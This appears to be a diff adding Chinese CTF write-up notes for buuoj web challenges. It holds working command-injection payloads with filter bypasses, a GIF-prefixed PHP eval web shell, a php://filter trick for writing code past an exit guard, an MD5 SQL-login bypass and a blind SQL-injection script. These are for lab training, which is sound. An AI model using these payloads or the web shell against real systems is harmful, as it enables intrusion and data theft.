@@ -845,6 +845,185 @@ c= 0x49c627fa815685ad85060c0891e2cd04b5cd722cd82cc809835cb43da79b21ce547f4139da6
 
 - 与php:filter类似，访问本地文件，但是只能传入绝对路径
 
+**[GXYCTF2019]Ping Ping Ping（RCE）**
+
+> ls了一下，看看目录：
+
+![](img/11.png)
+
+> 试一下cat index：
+
+![](img/12.png)
+
+> 这里空格被过滤了
+
+过滤空格了，可以用`${IFS}$`代替：
+
+可能也过滤了`{}`，用`$IFS$1`代替：
+payload：
+`?ip=127.0.0.1;cat$IFS$1index.php`
+
+![](img/13.png)
+
+一目了然过滤了啥，`flag字眼`也过滤了，`bash也没了`，不过sh没过滤：
+
+`?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh`
+
+`Y2F0IGZsYWcucGhw是cat flag.php的base64-encode`
+
+
+也可以尝试 payload
+
+`?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php`
+
+![](img/14.png)
+
+F12 可见下面有 flag。
+
+
+## 极客大挑战2019-http题解
+
+查看网页源码，发现一个文件secret.php。
+
+![](img/15.png)
+
+secret.php的内容如下：
+
+![](img/16.png)
+
+页面要求必须从`https://www.Sycsecret.com`进入，使用`python添加headers访问即可`。
+
+
+```PY
+import requests
+url = 'http://node3.buuoj.cn:25875/Secret.php'
+headers={"Referer":"https://www.Sycsecret.com","Origin":"https://www.Sycsecret.com",}
+headers['User-Agent'] = "Syclover"
+headers['X-Forwarded-For'] = '127.0.0.1'
+r = requests.get(url,headers=headers)
+print(r.text)
+```
+
+结果显示`Please use "Syclover" browser。`
+
+在headers里面继续添加 `User-Agent`
+
+`headers['User-Agent'] = "Syclover"`
+
+继续访问，得到`No!!! you can only read this locally!!!`
+
+应该是要伪造IP，在headers里面添加X-Forwarded-For
+
+`headers['X-Forwarded-For'] = '127.0.0.1'`
+
+![](img/17.png)
+
+
+php - phtml马
+```php
+GIF89a? <script language="php">eval($_REQUEST[shell])</script>
+```
+
+
+## 绕过<?php exit(0);?>
+
+```php
+<?php
+$content = '<?php exit(0);?>';
+$content .= @$_POST['code'];
+$filename = @$_POST['filename'];
+if (isset($filename)){
+file_put_contents($filename, $content);
+}else{
+echo "今天天气不错";
+}
+?>
+```
+
+- [php伪协议](https://www.leavesongs.com/PENETRATION/php-filter-magic.html)
+
+我们如果使用　　file=php://filter/write=convert.base64-decode　　来进行对file变量的处理，既以base64的编码来读。
+因为<?php exit;?>中"<、?、;、>"等符号解码时都会被忽略，所以命令就变成了-->    “phpexit”。
+
+将命令用base64编码，得到PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==，然后在原有的（phpexit）基础上添加上述base64代码，(****这里我们为了让其成为八位，所以任意在后面加一个a)得到
+
+`phpexitaPD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==`
+
+而传过去的值为
+
+`code=aPD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==`
+
+凑一下就得到flag
+```
+code=aPD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg=&filename=php://filter/write=convert.base64-decode/resource=1.php
+```
+
+### [BJDCTF2020]Easy MD5
+
+**password='".md5($pass,true)."'**
+
+`ffifdyop`，这个点的原理是 `ffifdyop` 这个字符串被 md5 哈希了之后会变成 `276f722736c95d99e921722cf9ed621c`，这个字符串前几位刚好是 ‘ or ‘6，
+而 Mysql 刚好又会吧 hex 转成 ascii 解释，因此拼接之后的形式是`1select * from 'admin' where password='' or '6xxxxx'`
+
+等价于 or 一个永真式，因此相当于万能密码，可以绕过md5()函数
+
+**md5 bypass**
+
+md5()或者sha1()之类的函数计算的是一个字符串的哈希值，对于数组则返回false，如果$a和$b都是数组则双双返回FALSE, 两个FALSE相等得以绕过
+
+![](img/18.png)
+
+
+
+### 异或
+
+这东西和那个堆叠注入一样，就见过一次，从此再也没用过，但这次就用到了。用它可以起到代替or的作用。
+`0^(ascii(substr((select(flag)from(flag)),1,1))>1)`
+
+但还有一些是没有用异或，用的是if，可if有局限性，在id为数字型时，可以直接 `select * from users where id=if(1=1,1,0)`，但如果id单引号字符型或双引号字符型，那就必须在if前加or或and。
+
+就下来就时很容易的`bool注入`了
+```py
+import requests
+import time
+
+url = "http://be7c3bbe-f847-4c30-bfbd-baa005a54773.node3.buuoj.cn/index.php"
+payload = {
+	"id" : ""
+}
+result = ""
+for i in range(1,100):
+	l = 33
+	r =130
+	mid = (l+r)>>1
+	while(l<r):
+		payload["id"] = "0^" + "(ascii(substr((select(flag)from(flag)),{0},1))>{1})".format(i,mid)
+		html = requests.post(url,data=payload)
+		print(payload)
+		if "Hello" in html.text:
+			l = mid+1
+		else:
+			r = mid
+		mid = (l+r)>>1
+	if(chr(mid)==" "):
+		break
+	result = result + chr(mid)
+	print(result)
+print("flag: " ,result)
+```
+
+---
+
+## 反序列化
+
+
+
+
+
+
+
+
+
 
 
 
